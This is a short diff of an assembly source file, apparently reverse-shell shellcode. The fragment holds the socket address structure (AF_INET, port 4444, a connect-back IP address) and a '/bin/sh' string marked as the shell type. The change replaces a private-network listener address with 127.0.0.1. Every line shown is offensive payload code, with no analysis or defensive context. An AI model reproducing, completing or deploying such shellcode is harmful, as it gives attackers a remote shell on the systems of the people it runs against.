@@ -103,7 +103,7 @@ parent:
 struct:
 .ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
 .ascii "\x11\x5c"     // port number 4444 
-.byte 172,21,216,217      // IP Address 
+.byte 127,0,0,1      // IP Address 
 
 binsh:
 .ascii "/bin/shX"   // shell type
